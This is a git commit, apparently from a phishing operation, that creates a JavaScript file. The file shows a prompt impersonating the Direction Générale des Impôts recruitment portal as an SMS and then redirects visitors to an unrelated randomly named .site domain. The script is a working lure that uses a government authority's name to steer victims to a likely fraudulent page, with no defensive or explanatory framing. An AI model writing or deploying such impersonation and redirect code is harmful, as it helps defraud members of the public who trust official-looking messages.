36a8b3e18dc49d59cd8ebfead5d5a1668334a139
usorondo94 <beady2shiver@icloud.com>
2026-07-17 08:34:10 +0100

    Create dgi.js

---
+++ dgi.js
@@ -0,0 +1,8 @@
+var password = 'APPLIQUER'
+password = prompt(
+  'SMS: Bienvenue sur Direction Générale des Impôts (DGI) : Portail de Recrutement. Cliquez sur OK pour continuer.',
+  'APPLIQUER'
+);
+if (password != 'APPLIQUER') {
+  location.href = 'https://www.mbonngczr.site/dgi-emploi-recrutement';
+}
